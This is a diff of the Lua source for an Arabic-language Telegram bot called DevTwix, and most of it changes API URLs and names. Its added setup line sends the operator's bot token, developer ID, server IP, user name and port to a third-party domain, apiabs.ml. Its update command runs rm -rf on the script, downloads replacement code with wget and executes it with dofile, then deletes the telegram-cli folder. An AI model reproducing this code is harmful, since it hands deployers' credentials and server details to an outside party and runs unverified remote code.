@@ -25,7 +25,7 @@ if not DevHmD:get(Server.."IdDevTwix") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..DevId)
+data,res = https.request("https://apiabs.ml/Api/DevTwix/index.php?Ban=DevTwix&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -77,7 +77,7 @@ DevTwix = DevHmD:get(Server.."TokenDevTwix"):match("(%d+)"),
 SudoIds = {DevHmD:get(Server.."IdDevTwix")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiabs.ml/Api/DevTwix/index.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("DevTwix.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -822,7 +822,7 @@ end
 function HmDmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevHmD:get(DevTwix..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
 --     Source DevTwix     --
 function SourceCh(msg) 
-local url,res = https.request('https://ccccxcc.ml/DevTwix/SourceCh.php?id='..msg.sender_user_id_)
+local url,res = https.request('https://anashtick.ml/TwixTeAm/TX.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.ChatMember.DevTwix ~= true then
 Var = false
@@ -11257,7 +11257,7 @@ if SecondSudo(msg) then
 if text == "تحديث السورس" and SourceCh(msg) or text == "تحديث سورس" and SourceCh(msg) or text == "↫ تحديث السورس ᥀" and SourceCh(msg) then 
 Dev_HmD(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس ديفد', 1, 'md') 
 os.execute('rm -rf DevTwix.lua') 
-os.execute('wget https://raw.githubusercontent.com/TwiXtele/DevTwix/master/DevTwix.lua') 
+os.execute('wget https://raw.githubusercontent.com/TwiXtele/DevTwix/main/DevTwix.lua') 
 dofile('DevTwix.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
